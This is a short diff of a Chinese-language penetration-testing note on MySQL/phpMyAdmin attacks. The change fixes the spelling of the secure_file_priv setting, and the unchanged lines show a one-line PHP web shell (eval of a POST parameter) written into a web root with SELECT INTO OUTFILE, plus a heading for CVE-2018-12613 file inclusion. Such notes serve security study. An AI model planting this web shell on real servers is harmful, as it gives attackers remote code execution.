@@ -16,7 +16,7 @@ set global general_log='off';             #关闭general_log模式
 ```shell
 select "<?php @eval($_POST[yxcms]);?>" into outfile " C://phpstudy/www/info.php"
 ```
-需要配置文件中 secure-file-priv 值为NULL, 且更改后需重启服务才生效且更改后需重启服务才生效
+需要配置文件中 secure_file_priv 值为NULL, 且更改后需重启服务才生效且更改后需重启服务才生效
 
 
 ### CVE-2018-12613 文件包含
